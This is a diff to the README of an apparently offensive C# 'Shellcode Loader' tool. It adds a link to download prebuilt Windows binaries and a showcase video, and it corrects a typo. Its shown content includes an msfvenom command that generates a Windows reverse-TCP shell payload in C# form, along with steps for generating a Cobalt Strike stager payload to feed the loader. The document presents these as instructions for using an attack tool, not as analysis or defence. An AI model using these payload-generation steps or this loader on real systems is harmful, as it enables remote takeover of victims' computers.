@@ -1,5 +1,8 @@
 # ⚔️ <b>Shellcode Loader 1.0</b>
+>![CSHARP](https://img.shields.io/badge/Language-CSHARP-purple?style=for-the-badge&logo=csharp) 
 >![Banner](banner.png)
+
+### > **[⬇️ Download for Windows](https://github.com/K3rnel-Dev/Advanced-Shellcode-Loader/releases/download/Build/Binaries.zip)**  
 
 ```diff
 - to compile this project required and dnlib package
@@ -13,7 +16,7 @@
     2) Cobalt Strike shellcode (csharp)
 
  ```shell
- msfvenom -p windows/shell_reverse_tcp LHOST=<iface> LPORT=<port> -f csharp > shell.txt # metaslpoit
+ msfvenom -p windows/shell_reverse_tcp LHOST=<iface> LPORT=<port> -f csharp > shell.txt # metasploit
 
  # Cobalt Strike
  Payloads -> Stager Payload Generator
@@ -33,6 +36,7 @@
 
 # 📽️ Showcase:
 
+https://github.com/user-attachments/assets/70e8e488-bdb8-439a-9da4-7521efb3a566
 
 ## 📸 **Screens**: 
 > ![1](1.png)
